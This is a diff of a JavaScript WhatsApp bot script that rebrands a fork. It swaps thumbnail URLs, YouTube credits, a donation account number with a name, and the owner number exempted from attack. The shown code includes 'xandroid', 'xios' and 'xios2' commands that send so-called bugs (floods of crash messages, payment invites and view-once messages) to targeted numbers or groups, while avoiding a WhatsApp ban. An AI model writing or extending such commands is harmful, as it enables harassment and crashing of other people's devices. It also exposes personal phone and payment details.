@@ -1222,7 +1222,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${latensi.toFixed(4)} Second`,
-                            thumbnailUrl: 'https://telegra.ph/file/3a21bf26bedef7966fd74.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/3be11168e1195919abeed.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1244,7 +1244,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `${ownername}`,
-                            thumbnailUrl: 'https://telegra.ph/file/3a21bf26bedef7966fd74.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/3be11168e1195919abeed.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1264,7 +1264,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                             showAdAttribution: true,
                             title: `${botname}`,
                             body: `FORGET DONATE`,
-                            thumbnailUrl: 'https://telegra.ph/file/3a21bf26bedef7966fd74.jpg',
+                            thumbnailUrl: 'https://telegra.ph/file/3be11168e1195919abeed.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1283,8 +1283,8 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                         externalAdReply: {
                             showAdAttribution: true,
                             title: `${botname}`,
-                            body: `SCRIPT OF ${botname} is on YouTube @prexzyvilla`,
-                            thumbnailUrl: 'https://telegra.ph/file/3a21bf26bedef7966fd74.jpg',
+                            body: `SCRIPT OF ${botname} is on YouTube @Voltagetechpro`,
+                            thumbnailUrl: 'https://telegra.ph/file/3be11168e1195919abeed.jpg',
                             sourceUrl: global.link,
                             mediaType: 1,
                             renderLargerThumbnail: true
@@ -1296,9 +1296,9 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 break
             case 'donate':
             case 'donasi':
-                let textnate = `Hello Brother ${pushname}\n\nNo matter how much you donate is very valuable for us`
+                let textnate = `Hello Brother ${pushname}\n\nNo matter how small it is you donate is very valuable for us`
                 XeonBotInc.sendMessage(m.chat, {
-                    text: 'Opay: 9159895444 ABIGAIL \n\n' + textnate
+                    text: 'Momo psb: 7045674902  Efosa\n\n' + textnate
                 }, {
                     quoted: m
                 })
@@ -2083,7 +2083,7 @@ case "xandroid": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2349159895444") {
+  if (cleanedNumber == "2347045674902") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2094,7 +2094,7 @@ case "xandroid": {
   sendVariousMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    "Successfully Sent Phoenix 🕊To @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
     [whatsappNumber]
   );
@@ -2115,7 +2115,7 @@ case "xios": {
   let encodedAmount = '' + encodeURI(amount);
   var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
   let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "2349159895444") {
+  if (cleanedNumber == "2347045674902") {
     return;
   }
   if (contactInfo.length == 0) {
@@ -2126,7 +2126,7 @@ case "xios": {
   sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
+    "Successfully Sent Phoenix 🕊To @" + whatsappNumber.split('@')[0] + 
     " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
     [whatsappNumber]
   );
@@ -2189,7 +2189,7 @@ case "xios2":
       await sleep(2000); // Adjusted sleep time for clarity
       sendViewOnceMessages(groupTarget, bugAmount);
       await sleep(2500); // Adjusted sleep time for clarity
-      replygcxeon("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
+      replygcxeon("*DONE🕊 PHOENIX HAS BEEN SENT TO THE GROUP!.*");
       XeonBotInc.groupLeave(groupTarget);
     } catch (error) {
       replygcxeon(util.format(error));
@@ -2386,7 +2386,7 @@ if (typemenu === 'v1') {
                             externalAdReply: {
                                 title: botname,
                                 body: ownername,
-                                thumbnailUrl: 'https://telegra.ph/file/3a21bf26bedef7966fd74.jpg',
+                                thumbnailUrl: 'https://telegra.ph/file/3be11168e1195919abeed.jpg',
                                 sourceUrl: link,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -2404,7 +2404,7 @@ if (typemenu === 'v1') {
       externalAdReply: {
       title: botname,
       body: ownername,
-      thumbnailUrl: 'https://telegra.ph/file/3a21bf26bedef7966fd74.jpg',
+      thumbnailUrl: 'https://telegra.ph/file/3be11168e1195919abeed.jpg',
       sourceUrl: ``,
       mediaType: 1,
       renderLargerThumbnail: true
